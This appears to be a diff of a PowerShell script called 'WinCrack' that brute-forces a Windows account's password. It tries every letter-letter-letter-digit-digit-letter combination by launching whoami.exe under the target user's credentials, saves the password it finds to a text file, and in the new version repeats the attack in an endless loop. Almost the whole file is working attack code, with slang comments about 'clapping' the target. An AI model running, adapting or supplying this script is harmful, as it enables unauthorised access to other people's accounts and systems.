@@ -1,67 +1,62 @@
-# =========================
-# SIGMA LLLNNL WINCRACK
-# =========================
 [console]::Title = "WinCrack"
 [console]::ForegroundColor = 'green'
 
-# --- CONFIG ---
-$domain = Read-Host "Domain (e.g., MY-PC)"
-$user = Read-Host "Username (opps to clap)"
-$letters = 'a'..'z'
-$numbers = 0..9
-$found = $false
-$saveFile = "sigma_rizz.txt"  # saves the password when found
-
-function Try-Crack {
-    param($username, $password, $domain)
-
-    try {
-        $ps = New-Object System.Diagnostics.ProcessStartInfo
-        $ps.FileName = "whoami.exe"   # dummy command, real attack cmd goes here
-        $ps.UseShellExecute = $false
-        $ps.UserName = $username
-        $ps.Password = (ConvertTo-SecureString $password -AsPlainText -Force)
-        $ps.Domain = $domain
-        [System.Diagnostics.Process]::Start($ps) | Out-Null
-        return $true
-    } catch {
-        return $false
+function win {
+    function check ($cmd, $username, $password, $domain) {
+        try {
+            $ps = New-Object System.Diagnostics.ProcessStartInfo
+            $ps.FileName = $cmd
+            $ps.UseShellExecute = $false
+            $ps.UserName = $username
+            $pass = ConvertTo-SecureString $password -AsPlainText -Force
+            $ps.Password = $pass
+            $ps.Domain = $domain
+            [System.Diagnostics.Process]::Start($ps) | Out-Null
+            "1"
+        } catch {
+            "0"
+        }
     }
-}
 
-Write-Host "`n[!] Starting sigma grind on $user@$domain" -ForegroundColor Yellow
+    # --- LLLNNL setup ---
+    $letters = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
+    $numbers = 0..9
 
-foreach ($l1 in $letters) {
-    foreach ($l2 in $letters) {
-        foreach ($l3 in $letters) {
-            foreach ($n1 in $numbers) {
-                foreach ($n2 in $numbers) {
-                    foreach ($l4 in $letters) {
-                        $combo = "$l1$l2$l3$n1$n2$l4"
-                        Write-Host "Trying combo: $combo" -NoNewline
-                        
-                        if (Try-Crack -username $user -password $combo -domain $domain) {
-                            Write-Host " ✅ CLAPPED! Password found: $combo" -ForegroundColor Green
-                            $combo | Out-File -FilePath $saveFile -Encoding utf8
-                            $found = $true
-                            break 6  # exit all loops immediately
-                        } else {
-                            Write-Host " ❌ failed" -ForegroundColor Cyan
+    Write-Host "Windows user password attack"
+    $dom = Read-Host -Prompt "Domain"
+    $user = Read-Host -Prompt "Username"
+
+    $dt = (Get-Date).DateTime
+    Write-Host "Started attack at $dt"
+
+    foreach ($l1 in $letters) {
+        foreach ($l2 in $letters) {
+            foreach ($l3 in $letters) {
+                foreach ($n1 in $numbers) {
+                    foreach ($n2 in $numbers) {
+                        foreach ($l4 in $letters) {
+                            $combo = "$l1$l2$l3$n1$n2$l4"
+                            $run = check -username $user -password $combo -domain $dom -cmd whoami
+                            Write-Host "Trying $combo ..." -ForegroundColor Cyan
+
+                            if ($run -eq "1") {
+                                $dt = (Get-Date).DateTime
+                                Write-Host "[DONE] Password found: $combo at $dt" -ForegroundColor Green
+                                
+                                # Save the winning combo to a file for rizz purposes
+                                $combo | Out-File -FilePath "sigma_rizz_password.txt" -Encoding UTF8
+                                return
+                            }
                         }
                     }
-                    if ($found) { break }
                 }
-                if ($found) { break }
             }
-            if ($found) { break }
         }
-        if ($found) { break }
     }
-    if ($found) { break }
+
+    Write-Host "All combos attempted. No password found." -ForegroundColor Red
 }
 
-if (-not $found) {
-    Write-Host "`n[!] Sigma grind complete, no gyat clapped..." -ForegroundColor Red
-} else {
-    Write-Host "`n[!] Rizz saved in $saveFile" -ForegroundColor Green
+while ($true) {
+    win
 }
